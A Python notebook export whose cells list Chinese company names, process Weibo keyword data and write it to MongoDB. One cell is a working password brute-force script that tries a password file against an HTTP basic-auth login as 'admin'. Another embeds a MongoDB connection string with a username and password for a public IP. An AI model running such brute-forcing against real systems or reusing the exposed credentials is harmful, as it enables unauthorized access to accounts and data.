#  '中国铝业',
#  '中海油',
#  '玉柴国际',
#  '广深铁路',
#  '中移动',
#  '中国人寿',
#  '瑞立集团',
#  '中国电信',
#  '中石化',
#  '上石化',
#  '东方航空',
#  '华能电力',
#  '南方航空',
#  '阿特斯',
#  '比克电池',
#  '中汽系统',
#  '中国天然',
#  '新龙亚洲',
#  '富维薄膜',
#  '南太电子',
#  '正保教育',
#  '永新视博',
#  '鑫苑置业',
#  '橡果国际',
#  '昱辉阳光',
#  '英利',
#  '泛华保险',
#  '奇景光电',
#  '晶澳太阳',
#  '凹凸科技',
#  '慧荣科技',
#  '中石油',
#  '中国联通',
#  '日月光半',
#  '友达光电',
#  '台积电',
#  '联电',
#  '矽品',
#  '和信超媒',
#  '畅游',
#  '华住酒店',
#  '中华电信',
#  '圣元国际',
#  '联游网络',
#  '搜房网',
#  '多元印刷',
#  '蓝汛',
#  '诺亚财富',
#  '易车网',
#  '希尼亚',
#  '康迪车业',
#  '中网在线',
#  'ATA公司',
#  '利华国际',
#  '山东昱合',
#  '太宇机电',
#  '同心国际',
#  '晶科能源',
#  '绿诺科技',
#  '大全新能',
#  '瑞达电源',
#  '中国生物',
#  '汉广厦房',
#  '奥瑞金种',
#  '赛诺国际',
#  '万得汽车',
#  '中国高速',
#  '福麒国际',
#  '海湾资源',
#  '双威教育',
#  '新奥混凝',
#  'JF中国基',
#  '武汉通用',
#  '艾格菲国',
#  '中国脐带',
#  '研控科技',
#  '中强能源',
#  '和利时自',
#  '联合信息',
# ...

# %%
import sys
import requests
from requests.auth import HTTPBasicAuth
 
def Brute_Force_Web(username,password):
    res=requests.get('http://192.168.1.113:8080/api/v1/login', auth=(username, password));
    if res.status_code == 200:
        print ("Crack Sucess!");
        print ("password:"+password);
        exit();
    else:
        print (res.status_code);
 
def GetPass():
    fp = open("password.txt","r")
    if fp == 0:
        print ("open file error!")
        return;
    while 1:
        line = fp.readline()
        if not line:
            break
        passwd = line.strip('\n')
        Brute_Force_Web("admin",passwd);
        
GetPass();

# %%
import pandas as pd
data = pd.read_csv('../ScrapyDatas/weibo_test_data.csv')

# %%
list(set(eval(list(data.words)[1])))
# Out:
# ['渎职', '生产', '道德', '疫苗', '国务院', '中国政府', '李克强']

# %%
import pymongo
mongo_uri = 'mongodb://impulse:njuacmicpc@120.79.139.239/weibo'

client = pymongo.MongoClient(host=mongo_uri, port=27017)
db = client['weibo']
collection = db['weibos']

for x in zip(list(data.id), list(data.words)):
    collection.update({'id':str(x[0])}, {'$set': {'words':eval(x[1])} })
# Out:
# /home/impulse/anaconda3/lib/python3.6/site-packages/ipykernel_launcher.py:9: DeprecationWarning: update is deprecated. Use replace_one, update_one or update_many instead.
#   if __name__ == '__main__':
